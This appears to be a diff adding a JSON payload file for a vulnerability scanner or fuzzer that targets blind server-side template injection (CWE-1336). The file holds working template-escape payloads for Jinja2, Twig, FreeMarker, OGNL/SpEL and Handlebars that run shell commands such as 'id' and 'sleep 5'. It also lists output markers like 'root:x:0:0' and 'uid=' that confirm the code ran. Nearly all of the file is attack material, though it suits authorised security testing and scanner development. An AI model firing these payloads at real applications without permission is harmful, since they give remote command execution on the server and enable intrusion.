@@ -1,0 +1,16 @@
+{
+  "variants": {
+    "jinja2_time": ["{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id', shell=True, stdout=-1).communicate() }}", "{{ config.__class__.__init__.__globals__['os'].popen('sleep 5').read() }}"],
+    "twig_time": ["{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"sleep 5\")}}", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"sleep 5\")}}"],
+    "freemarker_time": ["<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"sleep 5\")}", "${\"freemarker.template.utility.Execute\"?new()(\"sleep 5\")}"],
+    "ognl_time": ["${T(java.lang.Thread).sleep(5000)}", "${@java.lang.Thread@sleep(5000)}"],
+    "handlebars_time": ["{{#with \"s\" as |string|}}...{{this.push \"require('child_process').execSync('sleep 5')\"}}...{{/with}}"],
+    "generic_time": ["${T(java.lang.Thread).sleep(5000)}", "#{Thread.sleep(5000)}"]
+  },
+  "payloads": ["${T(java.lang.Thread).sleep(5000)}", "{{ ''.__class__.__mro__[1].__subclasses__() }}"],
+  "markers": ["root:x:0:0", "uid=", "gid=", "groups="],
+  "metadata": {
+    "cwe": "CWE-1336",
+    "technique": "SSTI blind (time-based + error-based per engine)"
+  }
+}
